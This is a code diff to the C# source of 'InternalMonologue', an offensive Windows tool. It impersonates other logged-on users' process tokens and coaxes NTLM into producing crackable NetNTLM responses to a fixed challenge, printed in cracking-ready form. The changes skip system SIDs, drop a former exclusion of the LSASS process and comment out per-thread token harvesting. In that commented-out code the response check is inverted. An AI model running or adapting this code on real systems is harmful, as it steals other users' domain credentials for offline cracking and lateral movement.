@@ -69,7 +69,7 @@ namespace InternalMonologue
         [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         static extern int InitializeSecurityContext(
             ref SECURITY_HANDLE phCredential,
-            ref SECURITY_HANDLE phContext,  
+            ref SECURITY_HANDLE phContext,
             string pszTargetName,
             int fContextReq,
             int Reserved1,
@@ -193,7 +193,7 @@ namespace InternalMonologue
 
                 return SID;
             }
-            catch 
+            catch
             {
                 CloseHandle(token);
                 return null;
@@ -213,10 +213,16 @@ namespace InternalMonologue
                     //Get the SID of the token
                     SID = GetLogonId(token);
                     CloseHandle(token);
+                    if (SID == "S-1-5-18" || SID == "S-1-5-19" || SID == "S-1-5-20" || SID == "S-1-5-96-0-0" || SID == "S-1-5-96-0-1" || SID == "S-1-5-90-0-1")
+                    {
+                        //do not touch processes owned by system, local service, network service, font driver host, or window manager
+                        return;
+                    }
 
                     //Check if this user hasn't been handled yet
                     if (SID != null && authenticatedUsers.Contains(SID) == false)
                     {
+                        if (verbose) Console.WriteLine("{0} {1}", SID, process.ProcessName);
                         if (OpenProcessToken(process.Handle, 0x0002, ref token))
                         {
                             var sa = new SECURITY_ATTRIBUTES();
@@ -239,7 +245,7 @@ namespace InternalMonologue
                                     if (verbose == true) Console.WriteLine("Impersonated user " + WindowsIdentity.GetCurrent().Name);
                                     string result = InternalMonologueForCurrentUser(challenge);
                                     //Ensure it is a valid response and not blank
-                                    if (result != null && result.Length > 0)
+                                    if (!string.IsNullOrWhiteSpace(result))
                                     {
                                         Console.WriteLine(result);
                                         authenticatedUsers.Add(SID);
@@ -261,75 +267,80 @@ namespace InternalMonologue
             { /*Does not need to do anything if it fails*/ }
         }
 
-        public static void HandleThread(ProcessThread thread, string challenge, bool verbose)
-        {
-            try
-            {
-                var token = IntPtr.Zero;
-                var dupToken = IntPtr.Zero;
-                string SID = null;
+        //Iterating through each process's thread is unnecessary in most scenarios to find a token to extract a challenge-response
+        //public static void HandleThread(ProcessThread thread, string challenge, bool verbose)
+        //{
+        //    try
+        //    {
+        //        var token = IntPtr.Zero;
+        //        var dupToken = IntPtr.Zero;
+        //        string SID = null;
 
-                //Try to get thread handle
-                var handle = OpenThread(0x0040, true, new IntPtr(thread.Id));
+        //        //Try to get thread handle
+        //        var handle = OpenThread(0x0040, true, new IntPtr(thread.Id));
 
-                //If failed, return
-                if (handle == IntPtr.Zero)
-                {
-                    return;
-                }
+        //        //If failed, return
+        //        if (handle == IntPtr.Zero)
+        //        {
+        //            return;
+        //        }
 
-                if (OpenThreadToken(handle, 0x0008, true, ref token))
-                {
-                    //Get the SID of the token
-                    SID = GetLogonId(token);
-                    CloseHandle(token);
+        //        if (OpenThreadToken(handle, 0x0008, true, ref token))
+        //        {
+        //            //Get the SID of the token
+        //            SID = GetLogonId(token);
+        //            CloseHandle(token);
+        //            if (SID == "S-1-5-18")
+        //            {
+        //                return;
+        //            }
 
-                    //Check if this user hasn't been handled yet
-                    if (SID != null && authenticatedUsers.Contains(SID) == false)
-                    {
-                        if (OpenThreadToken(handle, 0x0002, true, ref token))
-                        {
-                            var sa = new SECURITY_ATTRIBUTES();
-                            sa.nLength = Marshal.SizeOf(sa);
+        //            //Check if this user hasn't been handled yet
+        //            if (SID != null && authenticatedUsers.Contains(SID) == false)
+        //            {
+        //                if (OpenThreadToken(handle, 0x0002, true, ref token))
+        //                {
+        //                    var sa = new SECURITY_ATTRIBUTES();
+        //                    sa.nLength = Marshal.SizeOf(sa);
 
-                            DuplicateTokenEx(
-                                token,
-                                0x0002 | 0x0008,
-                                ref sa,
-                                (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
-                                (int)1,
-                                ref dupToken);
+        //                    DuplicateTokenEx(
+        //                        token,
+        //                        0x0002 | 0x0008,
+        //                        ref sa,
+        //                        (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+        //                        (int)1,
+        //                        ref dupToken);
 
-                            CloseHandle(token);
+        //                    CloseHandle(token);
 
-                            try
-                            {
-                                using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
-                                {
-                                    if (verbose == true) Console.WriteLine("Impersonated user " + WindowsIdentity.GetCurrent().Name);
-                                    string result = InternalMonologueForCurrentUser(challenge);
-                                    //Ensure it is a valid response and not blank
-                                    if (result != null && result.Length > 0)
-                                    {
-                                        Console.WriteLine(result);
-                                        authenticatedUsers.Add(SID);
-                                    }
-                                    else if (verbose == true) { Console.WriteLine("Got blank response for user " + WindowsIdentity.GetCurrent().Name); }
-                                }
-                            }
-                            catch 
-                            { /*Does not need to do anything if it fails*/ }
-                            finally
-                            {
-                                CloseHandle(dupToken);
-                            }
-                        }
-                    }
-                }
-            }
-            catch (Exception)
-            { /*Does not need to do anything if it fails*/ }
-        }
+        //                    try
+        //                    {
+        //                        using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
+        //                        {
+        //                            if (verbose == true) Console.WriteLine("Impersonated user " + WindowsIdentity.GetCurrent().Name);
+        //                            string result = InternalMonologueForCurrentUser(challenge);
+        //                            //Ensure it is a valid response and not blank
+        //                            if (string.IsNullOrWhiteSpace(result))
+        //                            {
+        //                                Console.WriteLine(result);
+        //                                authenticatedUsers.Add(SID);
+        //                            }
+        //                            else if (verbose == true) { Console.WriteLine("Got blank response for user " + WindowsIdentity.GetCurrent().Name); }
+        //                        }
+        //                    }
+        //                    catch 
+        //                    { /*Does not need to do anything if it fails*/ }
+        //                    finally
+        //                    {
+        //                        CloseHandle(dupToken);
+        //                    }
+        //                }
+        //            }
+        //        }
+        //    }
+        //    catch (Exception)
+        //    { /*Does not need to do anything if it fails*/ }
+        //}
 
         //Maintains a list of handled users
         static List<string> authenticatedUsers = new List<string>();
@@ -377,6 +388,8 @@ namespace InternalMonologue
             //Set defaults
             bool impersonate = true, downgrade = true, restore = true, verbose = false;
             string challenge = "1122334455667788";
+            //add system SIDs to skip list:
+            authenticatedUsers.Add("S-1-5-18");
 
             if (args.Length > 0 && argDict.Count == 0)
             {
@@ -385,7 +398,7 @@ namespace InternalMonologue
             }
             else if (args.Length == 0)
             {
-                Console.Error.WriteLine("Running with default settings. Type -Help for more information.\n");
+                if (verbose) Console.Error.WriteLine("Running with default settings. Type -Help for more information.\n");
 
             }
 
@@ -451,14 +464,12 @@ namespace InternalMonologue
                     if (verbose == true) Console.WriteLine("Starting impersonation");
                     foreach (Process process in Process.GetProcesses())
                     {
-                        if (process.ProcessName.Contains("lsass") == false) // Do not touch LSASS
-                        {
-                            HandleProcess(process, challenge, verbose);
-                            foreach (ProcessThread thread in process.Threads)
-                            {
-                                HandleThread(thread, challenge, verbose);
-                            }
-                        }
+                        HandleProcess(process, challenge, verbose);
+                        //for practical purposes, this is not necessary:
+                        //foreach (ProcessThread thread in process.Threads)
+                        //{
+                        //    HandleThread(thread, challenge, verbose);
+                        //}
                     }
                 }
                 else
@@ -479,7 +490,7 @@ namespace InternalMonologue
                 //If the process is not elevated, skip downgrade and impersonation and only perform an Internal Monologue Attack for the current user
                 if (verbose == true) Console.WriteLine("Not elevated. Performing attack with current NTLM settings on current user");
                 Console.WriteLine(InternalMonologueForCurrentUser(challenge));
-            }           
+            }
         }
 
         //This function performs an Internal Monologue Attack in the context of the current user and returns the NetNTLM response for the challenge 0x1122334455667788
@@ -488,10 +499,10 @@ namespace InternalMonologue
             SecBufferDesc ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
 
             SECURITY_HANDLE _hOutboundCred;
-                _hOutboundCred.LowPart = _hOutboundCred.HighPart = IntPtr.Zero;
+            _hOutboundCred.LowPart = _hOutboundCred.HighPart = IntPtr.Zero;
             SECURITY_INTEGER ClientLifeTime;
-                ClientLifeTime.LowPart = 0;
-                ClientLifeTime.HighPart = 0;
+            ClientLifeTime.LowPart = 0;
+            ClientLifeTime.HighPart = 0;
             SECURITY_HANDLE _hClientContext;
             uint ContextAttributes = 0;
 
@@ -580,9 +591,9 @@ namespace InternalMonologue
             }
             else if (nt_resp_len > 24)
             {
-                result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + challenge + ":" + ByteArrayToString(nt_resp).Substring(0,32) + ":" + ByteArrayToString(nt_resp).Substring(32);
+                result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + challenge + ":" + ByteArrayToString(nt_resp).Substring(0, 32) + ":" + ByteArrayToString(nt_resp).Substring(32);
             }
-            
+
             return result;
         }
 
@@ -642,7 +653,7 @@ namespace InternalMonologue
 
             }
 
-            return ascii;         
+            return ascii;
         }
     }
 
